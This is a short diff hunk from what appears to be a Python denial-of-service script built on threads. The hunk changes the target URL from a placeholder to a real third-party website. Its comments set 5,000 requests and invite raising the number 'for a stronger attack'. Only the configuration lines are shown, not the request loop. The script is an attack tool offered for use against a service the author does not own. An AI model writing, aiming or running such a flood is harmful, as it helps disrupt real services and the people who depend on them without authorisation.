@@ -4,7 +4,7 @@ import time
 import threading
 
 # Target URL
-target_url = "http://target_server.com"  # Change this to your target server's URL
+target_url = "http://google.com"  # Change this to your target server's URL
 
 # Number of requests to be sent
 num_requests = 5000  # Increase this number for a stronger attack
